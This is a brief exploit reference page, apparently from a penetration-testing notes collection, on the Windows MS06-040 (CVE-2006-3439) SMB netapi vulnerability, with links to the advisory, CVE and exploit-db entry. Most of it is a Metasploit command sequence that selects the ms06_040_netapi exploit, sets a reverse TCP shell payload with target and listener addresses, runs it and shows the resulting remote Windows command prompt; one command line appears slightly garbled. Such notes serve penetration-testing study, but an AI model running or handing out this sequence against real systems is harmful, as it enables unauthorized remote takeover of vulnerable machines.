# MS06-040

MS06-040

Vulnerability reference:
 * [MS06-040](https://technet.microsoft.com/library/security/ms06-040)
 * [CVE-2006-3439](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3439)  
 * [exp-db](https://www.exploit-db.com/exploits/2355/)  

## msf Usage
* [YouTube-ms06-040](https://www.youtube.com/watch?v=AsZ8qTr7IoE)
```
msf > search ms06_040
msf > use exploit/windows/smb/ms06_040_netapi
msf exploit(ms06_040_netapi) > show payloads 
msf exploit(ms06_040_netapi) > set payload windows/shell/reverse_tcp
msf exploit(ms06_040_netapi) > set RHOST 192.1.80.2 
msf exploit(ms06_040_netapi) > set LHOST 192.1.80.152 
msf exploit(ms06_040_netapi) > set TARGET 0TARGET -> 0
msf exploit(ms06_040_netapi) > exploit
session -i 1

Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-2000 Microsoft Corp.
C:\WINNT\system32>
```  

## References
* [深入浅出MS06-040](http://blog.csdn.net/iiprogram/article/details/2820149)
* [How to Exploit MS06-040](https://www.linickx.com/how-to-exploit-ms06-040)


